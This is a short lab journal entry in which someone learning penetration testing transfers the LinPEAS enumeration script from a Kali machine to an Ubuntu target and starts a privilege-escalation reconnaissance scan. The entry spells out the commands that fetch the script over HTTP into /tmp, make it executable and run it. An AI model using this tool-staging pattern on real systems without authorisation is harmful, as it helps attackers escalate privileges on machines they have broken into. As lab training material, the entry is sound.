🧭 Day 7: Privilege Escalation Recon (LinPEAS Introduction)
📝 Executive Summary

Today I began the privilege escalation phase.
Rather than immediately exploiting the system, the goal was to identify potential weaknesses and misconfigurations using a standard escalation reconnaissance tool, LinPEAS.

The focus was not exploitation itself, but understanding the system’s privilege surface, service permissions, SUID binaries, and escalation vectors.

💻 Lab Scenario
1. The Setup (Kali Linux)

I downloaded the latest LinPEAS binary and prepared it for transfer.

wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
sudo python3 -m http.server 80


This provided a lightweight and controlled hosting method for the target to download the script.

2. The Import (Ubuntu Target)

Once connected via SSH, I used the same ingress method practiced on Day 6.

cd /tmp
wget http://192.168.160.130/linpeas.sh
chmod +x linpeas.sh


This confirmed repeatable tool transfer capability, now used for a real enumeration script rather than a dummy file.

3. Running LinPEAS (Initial Scan)
./linpeas.sh


Only a subset of the output was reviewed today. Full escalation analysis will continue on Day 8.

🔍 Outcome

Confirmed successful transfer of a real escalation enumerator

Demonstrated repeatable ingress transfer pattern

Began initial privilege escalation surface assessment

Personal Note

Privilege escalation looks much more complex when the tool output is right in front of you rather than in a diagram or tutorial.
Today felt like the first honest step into understanding how attackers move beyond access and begin shaping control.
